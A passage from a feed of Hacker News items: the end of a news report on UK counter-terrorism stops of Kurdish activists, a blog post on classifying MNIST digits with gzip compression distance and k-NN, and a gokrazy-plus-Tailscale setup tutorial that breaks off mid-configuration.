first since the Covid pandemic, with her husband and teenage daughter.</p><p>“I asked the police why my passport was flagged and they said they didn’t know. The questions were very broad: they asked why I was interested in human rights. But they also asked whether I supported the PKK [a Kurdish political party banned in Turkey] and I said I didn’t and I didn’t support terrorist organisations,” she said.</p><p>Davies, who trains medical students, believes she was stopped because “I sympathise with the Kurdish cause in a general sense” and because she was involved in organising a Kurdish cultural event in Cardiff last November. Police took her DNA and photograph; her phone and Kindle were searched before she was allowed to leave.</p><p>The Home Office said<strong> </strong>schedule 7 enabled officers to stop, question, detain and search a person to determine whether they are or have been involved in terrorism. “Examinations have been instrumental in securing evidence to convict,” a spokesperson said.</p><p>Iida Kayhko, a doctoral researcher in security studies at Royal Holloway, University of London, said the belief in the British Kurdish community was that UK police were reflecting pressure from Ankara after President Recep Tayyip Erdoğan’s election victory in May, which has reinforced Kurdish repression within Turkey.</p><p>“It would seem that British counter-terrorism policing is being made use of to pursue the Erdoğan government’s aims of stifling Kurdish political expression,” she said.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: 78% MNIST accuracy using GZIP in under 10 lines of code (309 pts)]]></title>
            <link>https://jakobs.dev/solving-mnist-with-gzip/</link>
            <guid>37583593</guid>
            <pubDate>Wed, 20 Sep 2023 13:00:35 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://jakobs.dev/solving-mnist-with-gzip/">https://jakobs.dev/solving-mnist-with-gzip/</a>, See on <a href="https://news.ycombinator.com/item?id=37583593">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p><img src="https://jakobs.dev/media/gzip.png" alt="GZIP"></p>
<p>We can 'solve' MNIST up to ~78% accuracy with the following code-golfed obscurity:</p>
<div data-language="python"><pre><code>c <span>=</span> <span>lambda</span> z<span>:</span> <span>len</span><span>(</span>gzip<span>.</span>compress<span>(</span>z<span>.</span>tobytes<span>(</span><span>)</span><span>)</span><span>)</span>

<span>def</span> <span>ncd</span><span>(</span>x<span>,</span> y<span>)</span><span>:</span>
    <span>return</span> <span>(</span>c<span>(</span>x <span>+</span> y<span>)</span> <span>-</span> <span>min</span><span>(</span>c<span>(</span>x<span>)</span><span>,</span> c<span>(</span>y<span>)</span><span>)</span><span>)</span> <span>/</span> <span>max</span><span>(</span>c<span>(</span>x<span>)</span><span>,</span> c<span>(</span>y<span>)</span><span>)</span>

cls <span>=</span> <span>[</span><span>(</span>x<span>,</span> c<span>(</span>x<span>)</span><span>,</span> l<span>)</span> <span>for</span> x<span>,</span> l <span>in</span> training_set<span>]</span>

correct_predictions <span>=</span> <span>sum</span><span>(</span><span>[</span>np<span>.</span>array_equal<span>(</span>Counter<span>(</span>
    <span>[</span>l <span>for</span> _<span>,</span> _<span>,</span> l <span>in</span> <span>sorted</span><span>(</span><span>[</span><span>(</span>ncd<span>(</span>x1<span>,</span> x<span>)</span><span>,</span> x<span>,</span> l<span>)</span> <span>for</span> x<span>,</span> _<span>,</span> l <span>in</span> cls<span>]</span><span>,</span>
     key<span>=</span><span>lambda</span> t<span>:</span> t<span>[</span><span>0</span><span>]</span><span>)</span><span>[</span><span>:</span><span>5</span><span>]</span><span>]</span><span>)</span><span>.</span>most_common<span>(</span><span>1</span><span>)</span><span>[</span><span>0</span><span>]</span><span>[</span><span>0</span><span>]</span><span>,</span> label<span>)</span>
     <span>for</span> x1<span>,</span> label <span>in</span> test_set<span>]</span><span>)</span></code></pre></div>
<p>If you just want to see the code sample, <a href="https://github.com/Jakob-98/mono/blob/main/python/gzip_mnist/mnist_gzip.ipynb">here</a> is a link to the Jupyter Notebook containing the code to run this experiment.</p>
<p>Lets dive into why and how: yesterday while in the one-hour train ride from Eindhoven to Rotterdam, I was inspired by the post <a href="http://pepijndevos.nl/2023/07/15/chatlmza.html">text generation from data compression</a> and the (quite controversial) paper on <a href="https://aclanthology.org/2023.findings-acl.426/">parameter free text classification</a> to play around with using compression as an image classification mechanism. Previously, I worked on image compression for computer vision on the edge, so interested in applying the technique to the most seminal yet basic dataset, I attempted to use GZIP + K-NN as a classification mechanism for the MNIST (handwritten digits) dataset.</p>
<p>Breaking down the technique, it boils down to two components: GZIP and NCD (Normalized Compression Distance) as a similarity metric, and k-NN (k-Nearest Neighbors) for classification. In this approach, GZIP is essentially our tool which gives us a way to measure the complexity or information content of individual data points. NCD provides a normalized measure of how similar two data points are, based on how much more (or less) effort it takes to compress them together compared to compressing them separately.</p>
<p>For each test sample, the algorithm computes its NCD with every training sample (in our case, 100 training samples), sorts them, and selects the k smallest distances. The majority class among these k=5 closest neighbors is then predicted as the label for the test sample. As this is quite computationally expensive, I only took a subset of the test images to arrive at my accuracy measure. Of course, it would be more correct to use the full set, but I leave this an an exercise to the reader ;).</p>
<p>Here is a less obscured version of the algorithm:</p>
<div data-language="python"><pre><code><span>def</span> <span>compute_ncd</span><span>(</span>x1<span>,</span> x2<span>)</span><span>:</span>
    <span>"""Compute the Normalized Compression Distance (NCD) between two samples."""</span>
    Cx1 <span>=</span> <span>len</span><span>(</span>gzip<span>.</span>compress<span>(</span>x1<span>.</span>tobytes<span>(</span><span>)</span><span>)</span><span>)</span>
    Cx2 <span>=</span> <span>len</span><span>(</span>gzip<span>.</span>compress<span>(</span>x2<span>.</span>tobytes<span>(</span><span>)</span><span>)</span><span>)</span>
    Cx1x2 <span>=</span> <span>len</span><span>(</span>gzip<span>.</span>compress<span>(</span><span>(</span>x1 <span>+</span> x2<span>)</span><span>.</span>tobytes<span>(</span><span>)</span><span>)</span><span>)</span>
    
    <span>return</span> <span>(</span>Cx1x2 <span>-</span> <span>min</span><span>(</span>Cx1<span>,</span> Cx2<span>)</span><span>)</span> <span>/</span> <span>max</span><span>(</span>Cx1<span>,</span> Cx2<span>)</span>

<span>print</span><span>(</span><span>"Classifying test samples..."</span><span>)</span>

k <span>=</span> <span>5</span>  <span># Number of neighbors to consider</span>
correct_predictions <span>=</span> <span>0</span>  <span># Counter for correct predictions</span>
actual_labels <span>=</span> <span>[</span><span>]</span>
predicted_labels <span>=</span> <span>[</span><span>]</span>

<span># Cache compressed lengths for training samples</span>
compressed_lengths <span>=</span> <span>[</span><span>(</span>x<span>,</span> <span>len</span><span>(</span>gzip<span>.</span>compress<span>(</span>x<span>.</span>tobytes<span>(</span><span>)</span><span>)</span><span>)</span><span>,</span> label<span>)</span> <span>for</span> x<span>,</span> label <span>in</span> training_set<span>]</span>

<span>for</span> <span>(</span>x1<span>,</span> actual_label<span>)</span> <span>in</span> tqdm<span>(</span>test_set<span>[</span><span>:</span><span>100</span><span>]</span><span>)</span><span>:</span>
    <span># Calculate NCD for each training sample</span>
    distances <span>=</span> <span>[</span><span>(</span>compute_ncd<span>(</span>x1<span>,</span> x<span>)</span><span>,</span> label<span>)</span> <span>for</span> x<span>,</span> _<span>,</span> label <span>in</span> compressed_lengths<span>]</span>
    
    <span># Get k nearest neighbors and predict label</span>
    neighbors <span>=</span> <span>sorted</span><span>(</span>distances<span>,</span> key<span>=</span><span>lambda</span> x<span>:</span> x<span>[</span><span>0</span><span>]</span><span>)</span><span>[</span><span>:</span>k<span>]</span>
    top_k_class <span>=</span> <span>[</span>label <span>for</span> _<span>,</span> label <span>in</span> neighbors<span>]</span>
    predicted_class <span>=</span> Counter<span>(</span>top_k_class<span>)</span><span>.</span>most_common<span>(</span><span>1</span><span>)</span><span>[</span><span>0</span><span>]</span><span>[</span><span>0</span><span>]</span>
    
    <span># Update predictions and counts</span>
    actual_labels<span>.</span>append<span>(</span>actual_label<span>)</span>
    predicted_labels<span>.</span>append<span>(</span>predicted_class<span>)</span>
    correct_predictions <span>+=</span> <span>(</span>predicted_class <span>==</span> actual_label<span>)</span></code></pre></div>
<p><strong>Note:</strong> after writing this post, I found <a href="https://www.blackhc.net/blog/2019/mnist-by-zip/">this article</a> by Andreas Kirsch taking a similar approach back in 2019. His approach reaches around 35% accuracy.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Gokrazy is cool (240 pts)]]></title>
            <link>https://xeiaso.net/blog/gokrazy</link>
            <guid>37583234</guid>
            <pubDate>Wed, 20 Sep 2023 12:14:43 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://xeiaso.net/blog/gokrazy">https://xeiaso.net/blog/gokrazy</a>, See on <a href="https://news.ycombinator.com/item?id=37583234">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>When you deal with Linux, you end up hearing about "distributions" as different "flavors" of Linux combined with a bunch of other tools. This is mostly true, but it's slightly missing the forest for the trees.</p>
<p>Consider this famous and often misunderstood quote by Richard Stallman:</p>
<blockquote>
<p>I'd just like to interject for a moment. What you're referring to as Linux is in fact, GNU/Linux, or as I've recently taken to calling it, GNU plus Linux.Linux is not an operating system unto itself, but rather another free component of a fully functioning GNU system made useful by the GNU corelibs, shell utilities and vital system components comprising a full OS as defined by POSIX.</p>
</blockquote>
<figure><picture><source type="image/avif" srcset="https://cdn.xeiaso.net/file/christine-static/hero/vroom.avif"><source type="image/webp" srcset="https://cdn.xeiaso.net/file/christine-static/hero/vroom.webp"><img loading="lazy" alt="hero image vroom" src="https://cdn.xeiaso.net/file/christine-static/hero/vroom-smol.png"></picture><figcaption>Nikon D3300, 35mm f/1.8 DX, a red formula one style car speeds along a racetrack with visible tire skidmarks. Photo by Xe Iaso</figcaption></figure>
<p>Many pages of ink have been spilled over analyzing this quote, and a lot of them fall short of really getting at the heart of the matter. What this actually means is something like this:</p>
<p>By itself, Linux is useless. It does boot the system, it does interface with hardware, but without a bunch of other tools, it's not very useful. It's like a car without a steering wheel, or a boat without a rudder. It does something, but it's not very useful. The real value of things like the GNU project, systemd, openrc and other tools in that vein is that they make Linux useful. They make it into a complete system that you can use to do things. They are the proverbial steering wheel and rudder in the metaphor.</p>
<div>
    <p><img src="https://cdn.xeiaso.net/sticker/mara/hacker/128" alt="Mara is hacker">
    </p>
    <p>&lt;<a href="https://xeiaso.net/characters#mara"><b>Mara</b></a>&gt; Fun fact, if you try to boot a Linux kernel without an init process, it'll just panic and crash!</p></div>
<p>Most Linux systems on the face of the planet are built with GNU tools and utilities. In order to compile the Linux kernel, you need to use <a href="https://gcc.gnu.org/">GCC</a>. In order to run <code>ls</code> to list files in the current directory, you need to use <a href="https://www.gnu.org/software/coreutils/coreutils.html">GNU coreutils</a>. Every dynamically linked program uses <a href="https://www.gnu.org/software/libc/">glibc</a> for performing basic system interactions like writing to files or opening network sockets. Everything is built on top of the GNU toolset. This is why Stallman is so adamant about calling it GNU/Linux. It's not that he's trying to take credit for Linux, it's that he's trying to give credit to the GNU project for making Linux useful.</p>
<p>However, there's a lot of room for nuance here. For example, <a href="https://alpinelinux.org/">Alpine Linux</a> is a Linux distribution that uses <a href="https://musl.libc.org/">musl libc</a> instead of <a href="https://www.gnu.org/software/libc/">glibc</a> and <a href="https://en.wikipedia.org/wiki/BusyBox">busybox</a> instead of GNU coreutils. It's still a Linux distribution, but it doesn't use the GNU toolset. It's still a Linux distribution, but it's not GNU/Linux.</p>
<div>
    <p><img src="https://cdn.xeiaso.net/sticker/mara/hacker/128" alt="Mara is hacker">
    </p>
    <p>&lt;<a href="https://xeiaso.net/characters#mara"><b>Mara</b></a>&gt; Also, for the record you can build the Linux kernel with clang, but that's a whole other can of worms. For one, GCC supports many more targets than clang likely ever will, but in general there are some compromises you need to make until clang implements some GCC-specific compiler extensions a bit better. Google, Facebook, and a few other companies do run LLVM compiled kernels in production though, so it's probably closer to viable than you think. Especially if you use ChromeOS or Android.</p></div>
<p>So, what is a Linux distribution? It's a collection of tools that make Linux useful. It's a collection of tools that make Linux into a complete system. It's not a "flavor" of Linux (though this conceptually can exist with alternative kernels like the Zen kernel patchset), it's a system that just so happens to make Linux useful.</p>
<p>As a counter-argument, consider the reason why Linux runs on more devices worldwide than there are people: <a href="https://en.wikipedia.org/wiki/Android_(operating_system)">Android</a>. Android does use the Linux kernel, but it doesn't use any GNU tools in the stack at all. You can't take programs that are compiled against other Linux distributions and run them on Android. You can't take programs that are compiled against Android and run them on other Linux distributions.</p>
<div>
    <p><img src="https://cdn.xeiaso.net/sticker/aoi/wut/64" alt="Aoi is wut">
    </p>
    <p>&lt;<a href="https://xeiaso.net/characters#aoi"><b>Aoi</b></a>&gt; Wait, so does this mean Android's not a Linux distribution? What is it then?</p></div>
<p>I'm going to argue that Android is not a Linux distribution unto itself. Android is a Linux <em>implementation</em>. It uses the Linux kernel, but that's where the similarities with the rest of the ecosystem end. Android is its own little world where there's just enough system tools to get the system running, but once you get into the UI, it's a completely different world. It's a completely different ecosystem. It's a completely different operating system.</p>
<div>
    <p><img src="https://cdn.xeiaso.net/sticker/aoi/wut/64" alt="Aoi is wut">
    </p>
    <p>&lt;<a href="https://xeiaso.net/characters#aoi"><b>Aoi</b></a>&gt; So what's the difference between a Linux distribution and a Linux implementation?</p></div>

<div>
    <p><img src="https://cdn.xeiaso.net/sticker/cadey/enby/64" alt="Cadey is enby">
    </p>
    <p>&lt;<a href="https://xeiaso.net/characters#cadey"><b>Cadey</b></a>&gt; It's a bit of a fuzzy line, but I'd say that a Linux distribution is a collection of discrete tools that make Linux useful, and a Linux implementation is a cohesive collection of bespoke tools that make Linux into a complete system. Really, you could argue that if it has <code>/bin/sh</code>, it's a Linux distribution.</p></div>
<h2>gokrazy</h2>
<p><a href="https://gokrazy.org/">gokrazy</a> is a Linux implementation that I've used off and on for a few years now. It's a very interesting project because everything on the system is written in Go save the kernel. The init process is in Go (and even listens over HTTP to handle updates!), every userland process is written in Go, and even the core system services are written in Go.</p>
<p>Out of the box a gokrazy install comes with these basic tools:</p>
<ul>
<li>The <code>init</code> process that is mandated to be the parent of all userland processes by the Linux kernel.</li>
<li>A <a href="https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol">DHCP</a> client that automatically configures the network interface.</li>
<li>A <a href="https://en.wikipedia.org/wiki/Network_Time_Protocol">NTP</a> client that automatically sets the system clock.</li>
<li>A little tool to save randomness from the kernel to a file so that it can be used to seed the random number generator on boot (because the Raspberry Pi doesn't have a robust hardware random number generator)</li>
</ul>
<p>That's it. Everything else from the web UI to A/B update logic is written in Go. It boots in literal seconds, uses an insanely small amount of RAM out of the box, and runs with nearly zero overhead. When you configure your gokrazy install to run additional software, you do so by adding the Go command path to a configuration file and then updating to trigger a reboot into the new version.</p>
<p>Here's an example of what my gokrazy virtual machine's file tree looks like:</p>
<pre><code><span>/ # tree etc gokrazy user
</span><span>etc
</span><span>├── breakglass.authorized_keys
</span><span>├── gokr-pw.txt
</span><span>├── gokrazy
</span><span>│   └── sbom.json
</span><span>├── hostname
</span><span>├── hosts
</span><span>├── http-port.txt
</span><span>├── https-port.txt
</span><span>├── localtime
</span><span>├── machine-id
</span><span>├── resolv.conf -&gt; /tmp/resolv.conf
</span><span>└── ssl
</span><span>    └── ca-bundle.pem
</span><span>
</span><span>gokrazy
</span><span>├── dhcp
</span><span>├── heartbeat
</span><span>├── init
</span><span>├── ntp
</span><span>└── randomd
</span><span>
</span><span>user
</span><span>├── breakglass
</span><span>├── fbstatus
</span><span>├── qemu-guest-kragent
</span><span>├── serial-busybox
</span><span>├── tailscale
</span><span>├── tailscaled
</span><span>└── waifud-gok-agent
</span></code></pre>
<p>That is the <em>entire</em> system. It's all stripped down to these few programs, configuration files, and one symlink for DNS resolution. This is a very minimal system, and it's all you need to run statically linked Go programs. It's very easy to deploy your own services to it too. It's probably the easiest platform I know of that lets you just deploy a Go binary and have it run as a service, automatically restarting when it crashes.</p>
<h2>The tooling</h2>
<p>When I used gokrazy back in the day, you had to use a command line called <code>gokr-packer</code> that you passed a bunch of command line flags to with information about all the Go programs you wanted to run on the machine, configuration for those programs, and any other meta-information like where the update tool should push the image to. It was a bit of a pain to use, but it worked. Recently the <a href="https://gokrazy.org/quickstart/"><code>gok</code></a> tool was added to the project, and this has been <em>revolutionary</em> when it comes to using and administrating gokrazy installs.</p>
<p>Essentially, <code>gok</code> is a wrapper around the existing <code>gokr-packer</code> logic with a JSON file to store your configuration details. It's a lot easier to use, understand, and automate. You don't have to remember command line flags or maintain unwieldy scripts. You just edit a JSON file and push updates with <code>gok update</code>. It's amazingly simple.</p>
<h2>Setting up a gokrazy machine</h2>
<p>As an example, I'm going to show you how to install a bunch of tailnet addons to a gokrazy machine. I'm also going to assume that you don't have a gokrazy install set up yet, so we'll need to install it. To do this, we'll need to do a few simple things:</p>
<ul>
<li>Install the <code>gok</code> tool.</li>
<li>Create your <code>gok</code> configuration.</li>
<li>Install Tailscale on the machine.</li>
<li>Create your "seed" image with <code>gok overwrite</code>.</li>
<li>Boot it on your Raspberry Pi or VM.</li>
<li>Push any updates to the image to the machine with <code>gok update</code>.</li>
</ul>
<p>First, let's install the <code>gok</code> tool. In order to do this, you need to have the <a href="https://golang.org/doc/install">Go toolchain</a> installed. Once you have that, you can run <code>go install</code> to install the <code>gok</code> tool:</p>
<pre><code><span>go install github.com/gokrazy/tools/cmd/gok@main
</span></code></pre>
<div>
    <p><img src="https://cdn.xeiaso.net/sticker/mara/hacker/128" alt="Mara is hacker">
    </p>
    <p>&lt;<a href="https://xeiaso.net/characters#mara"><b>Mara</b></a>&gt; You may want to ensure that <code>~/go/bin</code> is in your <code>$PATH</code> variable so that you can run it by the name <code>gok</code> instead of <code>~/go/bin/gok</code>.</p></div>
<p>Next, create a new gokrazy configuration with <code>gok new</code>:</p>
<pre><code><span>gok new -i casa
</span></code></pre>
<p>This will create a configuration named <code>casa</code> (cf: Spanish for "house") in <code>~/gokrazy/casa</code>. This is where all of your configuration files will live. You can edit the configuration file with <code>gok edit</code>:</p>
<pre><code><span>gok edit -i casa
</span></code></pre>
<details>
<summary>If you are making a virtual machine</summary>
<p>If you are making a virtual machine, you will need to override the kernel and firmware packages. You can do this by adding the following to your configuration file:</p>
<pre><code><span>{
</span><span>  </span><span>// ...
</span><span>  "</span><span>KernelPackage</span><span>": "</span><span>github.com/rtr7/kernel</span><span>",
</span><span>  "</span><span>FirmwarePackage</span><span>": "</span><span>github.com/rtr7/kernel</span><span>",
</span><span>  </span><span>// ...
</span><span>}
</span></code></pre>
<p>You will need to prefix the <code>gok overwrite</code> and <code>gok update</code> commands with <code>GOARCH=amd64</code> to ensure that Go builds x86_64 binaries instead of ARM binaries:</p>
<pre><code><span>GOARCH=amd64 gok update -i casa
</span></code></pre>
<p>If you don't do this, you will get arm64 binaries being built. This may require manual recovery of your virtual machine.</p>
</details>
<p>Let's make our lives easier by installing <a href="https://tailscale.com/">Tailscale</a> on the machine. By default, gokrazy will announce its hostname over DHCP, which usually makes most consumer routers pick it up and then lets you ping it by name. When you have <a href="https://tailscale.com/kb/1081/magicdns/">MagicDNS</a> enabled, Tailscale can take over this logic and prevent you from accessing the machine by name.</p>
<p>However, Tailscale is written in Go and doesn't require any of the services that most Linux distributions provide in order to function. It's a perfect fit for gokrazy. You can install it with <code>gok add</code>:</p>
<pre><code><span>gok add tailscale.com/cmd/tailscaled
</span><span>gok add tailscale.com/cmd/tailscale
</span></code></pre>
<p>And be sure to add the <code>mkfs</code> service to create a persistent partition on <code>/perm</code>:</p>
<pre><code><span>gok add github.com/gokrazy/mkfs
</span></code></pre>
<p>Next, fetch an <a href="https://tailscale.com/kb/1085/auth-keys/">auth key</a> from <a href="https://login.tailscale.com/admin/settings/keys">the admin console</a> and make sure you check that it's reusable. Then, add the following to your configuration file under the <code>PackageConfig</code> block:</p>
<pre><code><span>{
</span><span>    </span><span>// ...
</span><span>    "</span><span>PackageConfig</span><span>": {
</span><span>        </span><span>// ...
</span><span>        "</span><span>tailscale.com/cmd/tailscale</span><span>": {
</span><span>            "</span><span>CommandLineFlags</span><span>": [
</span><span>                "</span><span>up</span><span>",
</span><span>                 </span><span>// paste your key here!
</span><span>                "</span><span>--authkey=tskey-auth-hunter2-hunter2hunter2hunter2</span><span>"
</span><span>            ]
</span><span>        },
</span><span>        </span><span>// ...
</span><span>    }
</span><span>    </span><span>// ...
</span><span>}
</span></code></pre>

<p>This will make your machine automatically connect to Tailscale on boot.</p>
<p>Next, we need to create our "seed" image with <code>gok overwrite</code>. First, figure out what the device node for your SD card is. On Linux, you can do this with <code>lsblk</code>:</p>
<pre><code><span>lsblk
</span></code></pre>
<p>And then look for the one that has the same size as your SD card. In my case, it's <code>/dev/sdd</code>. Once you have that, you can run <code>gok overwrite</code>:</p>
<pre><code><span>gok overwrite --full /dev/sdd
</span></code></pre>
<p>However if you want to write the image to a file (such as if you are doing mass distribution or making a VM image), you need to use <code>gok overwrite</code> with a file instead of a device node. This will create a 16 GB image:</p>
<pre><code><span>gok overwrite -i casa --full gokrazy.img --target_storage_bytes 17179869184
</span></code></pre>
<p>Once you have your image, you can write it to your SD card with <code>dd</code> (or <a href="https://etcher.balena.io/">balenaEtcher</a>) or import it into your virtual machine hypervisor of choice.</p>
<p>Once you have your image written to your SD card, you can boot it on your Raspberry Pi or VM.</p>
<div>
    <p><img src="https://cdn.xeiaso.net/sticker/aoi/wut/64" alt="Aoi is wut">
    </p>
    <p>&lt;<a href="https://xeiaso.net/characters#aoi"><b>Aoi</b></a>&gt; Wait, so how do I log in with a shell?</p></div>

<div>
    <p><img src="https://cdn.xeiaso.net/sticker/cadey/enby/64" alt="Cadey is enby">
    </p>
    <p>&lt;<a href="https://xeiaso.net/characters#cadey"><b>Cadey</b></a>&gt; You don't. gokrazy doesn't have a login prompt. It's a single-user system. There is <a href="https://github.com/gokrazy/breakglass"><code>breakglass</code></a> as a tool of last resort to modify things, but you only have a very minimal subset of busybox to work with, so it should be avoided if at all possible.</p></div>
<p>Once you have your machine booted and it responds to pings over Tailscale, you can open its HTTP interface in your browser. If you called your machine <code>casa</code>, you can open it at <a href="http://casa/"><code>http://casa</code></a>. It will prompt you for a username and password. Your username is <code>gokrazy</code>, and the password is near the top of your <code>config.json</code> file. When you log in, you'll see a screen like this:</p>
<p><a href="https://cdn.xeiaso.net/file/christine-static/blog/2023/gokrazy/gokrazy-ui.jpg" target="_blank"><picture><source type="image/avif" srcset="https://cdn.xeiaso.net/file/christine-static/blog/2023/gokrazy/gokrazy-ui.avif"><source type="image/webp" srcset="https://cdn.xeiaso.net/file/christine-static/blog/2023/gokrazy/gokrazy-ui.webp"><img loading="lazy" alt="hero image blog/2023/gokrazy/gokrazy-ui" src="https://cdn.xeiaso.net/file/christine-static/blog/2023/gokrazy/gokrazy-ui-smol.png"></picture></a></p>
<p>This is the gokrazy web UI. It lets you see the status of your machine and any logs that are being generated by your applications. You can also start, stop, and restart any of your applications from here. It's a very simple UI, but it's fantastic for debugging and monitoring.</p>
<h2>Tailnet addons</h2>
<p>Now that we have a Gokrazy system up and running, let's add some programs to it! I'm going to list a couple tailnet addons that give your tailnet superpowers. These are all written in Go, so they're a perfect fit for gokrazy.</p>
<p>Today I'm going to show you how to install these tools into your tailnet:</p>
<ul>
<li><a href="https://github.com/tailscale/golink">golink</a> - a URL shortener at <code>http://go</code></li>
<li><a href="https://github.com/tailscale/tmemes">tmemes</a> - an internal meme generator you can host at <code>http://memegen</code></li>
<li><a href="https://github.com/tailscale-dev/tclip">tclip</a> - a pastebin you can host at <code>http://paste</code></li>
</ul>
<p>These tools help you augment your tailnet by giving you tools that will make you and your team's life a lot easier. A URL shortener helps you link to complicated Google Docs URLs. A meme generator gives you a new innovative way to let off steam. A pastebin lets you share text with your team without having to worry about the service you're using going offline due to no fault of your own.</p>
<h3>golink</h3>
<p>To install golink, we need to add the <code>golink</code> binary to the configuration. You can do this with <code>gok add</code>:</p>
<pre><code><span>gok add github.com/tailscale/golink/cmd/golink
</span></code></pre>
<p>Then configure it with <code>gok edit</code>:</p>
<pre><code><span>{
</span><span>    </span><span>// ...
</span><span>    "</span><span>PackageConfig</span><span>": {
</span><span>        </span><span>// ...
</span><span>        "</span><span>github.com/tailscale/golink/cmd/golink</span><span>": {
</span><span>            "</span><span>CommandLineFlags</span><span>": [
</span><span>                "</span><span>--sqlitedb=/perm/home/golink/data.db</span><span>"
</span><span>            ],
</span><span>            "</span><span>Environment</span><span>": [
</span><span>                </span><span>// the same one from before
</span><span>                "</span><span>TS_AUTHKEY=tskey-auth-hunter2-hunter2hunter2hunter2</span><span>"
</span><span>            ],
</span><span>            </span><span>// don't start the service until NTP catches up
</span><span>            "</span><span>WaitForClock</span><span>": </span><span>true
</span><span>        },
</span><span>        </span><span>// ...
</span><span>    }
</span><span>    </span><span>// ...
</span><span>}
</span></code></pre>
<p>And finally push it with <code>gok update</code>:</p>
<pre><code><span>gok update -i casa
</span></code></pre>
<p>It'll build the image, push it out over Tailscale, trigger a reboot, and be back up in the span of a minute. Once it's back up, you can open the web UI again and see the status of your <code>golink</code> instance at <a href="http://casa/status?path=%2fuser%2fgolink">http://casa/status?path=%2fuser%2fgolink</a>:</p>
<p><a href="https://cdn.xeiaso.net/file/christine-static/blog/2023/gokrazy/golink.jpg" target="_blank"><picture><source type="image/avif" srcset="https://cdn.xeiaso.net/file/christine-static/blog/2023/gokrazy/golink.avif"><source type="image/webp" srcset="https://cdn.xeiaso.net/file/christine-static/blog/2023/gokrazy/golink.webp"><img loading="lazy" alt="hero image blog/2023/gokrazy/golink" src="https://cdn.xeiaso.net/file/christine-static/blog/2023/gokrazy/golink-smol.png"></picture></a></p>
<p>And then you can start using short URLs at <a href="http://go/">http://go</a>:</p>
<p><a href="https://cdn.xeiaso.net/file/christine-static/blog/2023/gokrazy/golink-ui.jpg" target="_blank"><picture><source type="image/avif" srcset="https://cdn.xeiaso.net/file/christine-static/blog/2023/gokrazy/golink-ui.avif"><source type="image/webp" srcset="https://cdn.xeiaso.net/file/christine-static/blog/2023/gokrazy/golink-ui.webp"><img loading="lazy" alt="hero image blog/2023/gokrazy/golink-ui" src="https://cdn.xeiaso.net/file/christine-static/blog/2023/gokrazy/golink-ui-smol.png"></picture></a></p>
<p>And that's it! You now have a super minimal VM running small programs that let you do useful things to you. You can add more programs to your configuration file and push them with <code>gok update</code> to add more functionality to your machine. You can even add your own programs to the configuration file and push them to your machine. It's a very simple system, but it's very powerful.</p>
<h3>tmemes</h3>
<p>Google is infamous for having an internal service named <a href="https://www.buzzfeednews.com/article/reyhan/inside-googles-internal-meme-generator">memegen</a>. This allows Googlers to make internal-facing memes about the slings and arrows that impact them as highly paid programmers. This is an internal service inside Google that has a lot of serious investment of time and energy to make it the best possible experience it can be. It's to the point that reportedly people can keep up with how an all-hands meeting is going by the tone of the sarcastic memes that are being posted to memegen.</p>
<p>The main reason this is run inside Google is to avoid information leaking via memes. Yes, this is an actual threat model.</p>
<p>Thanks to the magic of Tailscale, you can make your own private memegen using <a href="https://github.com/tailscale/tmemes">tmemes</a>. tmemes is a tailnet addon that lets you post image macro templates and layer wisdom over it in the form of text.</p>
<p>Here's an example meme:</p>
<p><a href="https://cdn.xeiaso.net/file/christine-static/blog/2023/gokrazy/society-if-gokrazy.jpg" target="_blank"><picture><source type="image/avif" srcset="https://cdn.xeiaso.net/file/christine-static/blog/2023/gokrazy/society-if-gokrazy.avif"><source type="image/webp" srcset="https://cdn.xeiaso.net/file/christine-static/blog/2023/gokrazy/society-if-gokrazy.webp"><img loading="lazy" alt="hero image blog/2023/gokrazy/society-if-gokrazy" src="https://cdn.xeiaso.net/file/christine-static/blog/2023/gokrazy/society-if-gokrazy-smol.png"></picture></a></p>
<p>To add tmemes to your gokrazy machine, you can use <code>gok add</code>:</p>
<pre><code><span>gok add github.com/tailscale/tmemes/tmemes
</span></code></pre>
<p>Then open your config with <code>gok edit</code> and add the following to your <code>PackageConfig</code> block:</p>
<pre><code><span>{
</span><span>    </span><span>// ...
</span><span>    "</span><span>PackageConfig</span><span>": {
</span><span>        </span><span>// ...
</span><span>        "</span><span>github.com/tailscale/tmemes/tmemes</span><span>": {
</span><span>            "</span><span>Environment</span><span>": [
</span><span>                "</span><span>TS_AUTHKEY=tskey-auth-hunter2-hunter2hunter2hunter2</span><span>"
</span><span>            ],
</span><span>            "</span><span>CommandLineFlags</span><span>": [
</span><span>                </span><span>// change this to your desired hostname
</span><span>                "</span><span>--hostname=memegen</span><span>",
</span><span>                </span><span>// change this to your username on Tailscale
</span><span>                "</span><span>--admin=Xe@github</span><span>",
</span><span>                "</span><span>--store=/perm/home/tmemes</span><span>"
</span><span>            ],
</span><span>            "</span><span>WaitForClock</span><span>": </span><span>true
</span><span>        },
</span><span>        </span><span>// ...
</span><span>    },
</span><span>    </span><span>// ...
</span><span>}
</span></code></pre>
<p>And then push it with <code>gok update</code>:</p>
<pre><code><span>gok update -i casa
</span></code></pre>
<p>Then you can head to <a href="http://memegen/">http://memegen</a> and upload a template to make your own dank memes.</p>
<p>If you want to integrate your own tools with tmemes, you can check out the <a href="https://github.com/tailscale/tmemes/blob/main/docs/api.md">API documentation</a>. This should help you do whatever it is you want with a meme generator as a service.</p>
<h3>tclip</h3>
<p>Sometimes you just need a place to paste text and get a URL pointing to it. <a href="https://tailscale.dev/blog/tclip">tclip</a> is a tool that you can add to your tailnet and get exactly that. It's a very simple tool, but it's very useful. It's also written in Go, so it's a perfect fit for gokrazy. <a href="https://tailscale.dev/blog/tclip-updates-092023">Their recent update to remove Cgo dependencies</a> makes it possible to run your tclip node on a gokrazy machine.</p>
<p>To add tclip to your gokrazy machine, you can use <code>gok add</code>:</p>
<pre><code><span>gok add github.com/tailscale-dev/tclip/cmd/tclipd
</span></code></pre>
<p>Then open your config with <code>gok edit</code> and add the following to your <code>PackageConfig</code> block:</p>
<pre><code><span>{
</span><span>    </span><span>// ...
</span><span>    "</span><span>PackageConfig</span><span>": {
</span><span>        </span><span>// ...
</span><span>        "</span><span>github.com/tailscale-dev/tclip/cmd/tclipd</span><span>": {
</span><span>            "</span><span>CommandLineFlags</span><span>": [
